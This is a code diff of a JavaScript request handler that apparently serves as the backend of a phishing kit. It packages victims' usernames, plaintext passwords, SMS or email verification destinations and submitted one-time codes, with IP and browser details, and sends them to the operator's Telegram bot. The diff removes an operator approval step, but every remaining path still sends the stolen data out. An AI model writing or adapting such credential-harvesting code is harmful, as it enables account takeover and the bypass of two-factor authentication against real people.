@@ -15,55 +15,28 @@ export default async function handler(req, res) {
   }
 
   let message = '';
-  let sessionId = null;
-
-  // Initialize pending approvals
-  if (!global.pendingApprovals) {
-    global.pendingApprovals = new Map();
-  }
-  const pendingApprovals = global.pendingApprovals;
+  let parseMode = 'HTML';
 
   switch (action) {
     case 'domain_detection':
       message = formatDomainDetection(data);
       break;
     case 'login_attempt':
-      sessionId = data.sessionId;
       message = formatLoginAttempt(data);
-      // Store for approval
-      pendingApprovals.set(sessionId, { 
-        status: 'pending', 
-        data: data,
-        action: action,
-        timestamp: Date.now()
-      });
-      console.log(`💾 Stored login session: ${sessionId}`);
-      console.log(`📊 Total pending: ${pendingApprovals.size}`);
       break;
-    case 'auth_attempt':
-      sessionId = data.sessionId || 'AUTH_' + Date.now();
-      message = formatAuthAttempt(data);
+    case 'auth_method':
+      message = formatAuthMethod(data);
       break;
     case 'code_submitted':
-      sessionId = data.sessionId || 'CODE_' + Date.now();
       message = formatCodeSubmitted(data);
-      // Store for approval
-      pendingApprovals.set(sessionId, { 
-        status: 'pending', 
-        data: data,
-        action: action,
-        timestamp: Date.now()
-      });
-      console.log(`💾 Stored code session: ${sessionId}`);
-      console.log(`📊 Total pending: ${pendingApprovals.size}`);
       break;
     default:
       return res.status(400).json({ error: 'Invalid action' });
   }
 
   try {
-    await sendTelegramMessage(botToken, chatId, message, sessionId);
-    res.status(200).json({ success: true, sessionId: sessionId });
+    await sendTelegramMessage(botToken, chatId, message, parseMode);
+    res.status(200).json({ success: true });
   } catch (error) {
     console.error('Telegram send error:', error);
     res.status(500).json({ error: 'Failed to send message' });
@@ -87,30 +60,26 @@ IP        ${ip || 'Unknown'}
 }
 
 function formatLoginAttempt(data) {
-  const { username, password, timestamp, userAgent, ip, sessionId } = data;
+  const { username, password, timestamp, userAgent, ip } = data;
   return `
-LOGIN ATTEMPT — APPROVAL REQUIRED
+LOGIN ATTEMPT
 ─────────────────
 USERNAME  ${username}
 PASSWORD  ${password}
-SESSION   ${sessionId}
 TIME      ${timestamp}
 USER      ${userAgent || 'Unknown'}
 IP        ${ip || 'Unknown'}
 ─────────────────
-ACTION: APPROVE ${sessionId}
-        REJECT ${sessionId}
 `;
 }
 
-function formatAuthAttempt(data) {
-  const { method, destination, timestamp, userAgent, ip, sessionId } = data;
+function formatAuthMethod(data) {
+  const { method, destination, timestamp, userAgent, ip } = data;
   return `
-VERIFICATION REQUEST
+VERIFICATION METHOD SELECTED
 ─────────────────
 METHOD    ${method === 'sms' ? 'SMS' : 'EMAIL'}
 DEST      ${destination}
-SESSION   ${sessionId}
 TIME      ${timestamp}
 USER      ${userAgent || 'Unknown'}
 IP        ${ip || 'Unknown'}
@@ -119,46 +88,27 @@ IP        ${ip || 'Unknown'}
 }
 
 function formatCodeSubmitted(data) {
-  const { code, timestamp, userAgent, ip, sessionId } = data;
+  const { code, timestamp, userAgent, ip } = data;
   return `
-CODE SUBMITTED — APPROVAL REQUIRED
+CONFIRMATION CODE SUBMITTED
 ─────────────────
 CODE      ${code}
-SESSION   ${sessionId}
 TIME      ${timestamp}
 USER      ${userAgent || 'Unknown'}
 IP        ${ip || 'Unknown'}
 ─────────────────
-ACTION: APPROVE ${sessionId}
-        REJECT ${sessionId}
 `;
 }
 
-async function sendTelegramMessage(botToken, chatId, message, sessionId = null) {
+async function sendTelegramMessage(botToken, chatId, message, parseMode = 'HTML') {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-  
-  let replyMarkup = {};
-  if (sessionId) {
-    replyMarkup = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: 'APPROVE', callback_data: `approve_${sessionId}` },
-            { text: 'REJECT', callback_data: `reject_${sessionId}` }
-          ]
-        ]
-      }
-    };
-  }
   
   const payload = {
     chat_id: chatId,
     text: message,
-    disable_web_page_preview: true,
-    ...replyMarkup
+    parse_mode: parseMode,
+    disable_web_page_preview: true
   };
-
-  console.log(`📤 Sending to Telegram, session: ${sessionId}`);
 
   const response = await fetch(url, {
     method: 'POST',
